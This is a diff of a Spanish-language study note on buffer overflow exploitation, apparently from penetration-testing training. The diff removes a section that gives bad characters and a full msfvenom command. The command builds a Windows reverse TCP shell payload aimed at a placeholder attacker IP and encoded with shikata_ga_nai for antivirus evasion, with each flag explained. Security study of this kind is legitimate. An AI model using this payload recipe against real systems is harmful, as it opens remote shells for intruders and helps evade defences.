@@ -91,22 +91,4 @@ y se sigue haciendo esto hasta que verifiques que estan todos  los bytearrays o 
 
 esto se hace para usar luego [[msfvenom]] (de la suite de metasploit) para generear el shellcode con los bytearrays correctos
 
-tenemos entoces los badchars que son
-`\x00\x0a\x0d`
-
-por lo queq con msfvenom creariamos el shellcode de la siguiente manera
-
-```sh
-msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 LHOST=ip_atacante LPORT=443 -f py -e x86/shikata_ga_nai -b '\x00\x0a\x0d' EXITFUNC=thread
-``` 
-
-- -p especificamos el payload
-- --platform especificamos el SO
-- -a es para la arquitectura
-- LHOST es la ip a donde redirige la consola
-- LPORT es el puerto de la maquina atacante
-- -f es el tipo de salida en este caso para un script en python
-- -e es el encoder en este caso ocupa shikata ga nai como encoder para tema de evasion de antivirus y demas
-- -b son los badchars que debe excluir en el shellcod
-- EXITFUNC es para que el exploit dependa de un proceso hijo y no se rompa el servicio una vez terminado (o algo asi)
 
